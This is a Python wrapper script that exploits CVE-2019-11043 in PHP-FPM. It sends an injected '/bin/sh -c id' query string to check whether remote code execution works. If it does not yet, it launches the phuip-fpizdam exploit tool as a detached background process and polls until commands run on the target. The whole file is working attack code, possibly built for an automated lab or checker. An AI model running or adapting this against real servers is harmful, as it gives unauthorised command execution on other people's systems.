#!/usr/bin/env python3
"""CVE-2019-11043: probe + detached attacker. Returns WITHOUT trailing newline."""
import subprocess, sys, os, signal, time, urllib.request

if len(sys.argv) < 2:
    print("fail", end="", flush=True)
    sys.exit(0)

target_url = sys.argv[1]
base = target_url.rsplit("/", 1)[0]
probe_url = base + "/index.php?a=/bin/sh+-c+'id'&"
GO_BIN = os.path.expanduser("~/go/bin/phuip-fpizdam")
PID_FILE = "/tmp/phuip_fpizdam.pid"
LOG = "/tmp/phuip_fpizdam.log"

def probe():
    try:
        with urllib.request.urlopen(probe_url, timeout=0.5) as r:
            return b"uid=" in r.read()
    except:
        return False

def is_running():
    try:
        with open(PID_FILE) as f:
            os.kill(int(f.read().strip()), 0)
            return True
    except:
        return False

# Fast path
if probe():
    print("ok", end="", flush=True)
    sys.exit(0)

# Spawn phuip-fpizdam once (persists across attempts)
if not is_running():
    try: os.remove(PID_FILE)
    except: pass
    try:
        with open(LOG, "a") as logf:
            proc = subprocess.Popen(
                [GO_BIN, target_url],   # WITHOUT --skip-detect
                stdout=logf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                start_new_session=True,
            )
        with open(PID_FILE, "w") as f:
            f.write(str(proc.pid))
    except Exception:
        pass

# Probe for 12s (per attempt). Background phuip-fpizdam keeps working.
deadline = time.time() + 12
while time.time() < deadline:
    time.sleep(0.4)
    if probe():
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
            os.killpg(os.getpgid(pid), signal.SIGKILL)
        except: pass
        try: os.remove(PID_FILE)
        except: pass
        print("ok", end="", flush=True)
        sys.exit(0)

print("fail", end="", flush=True)
sys.exit(0)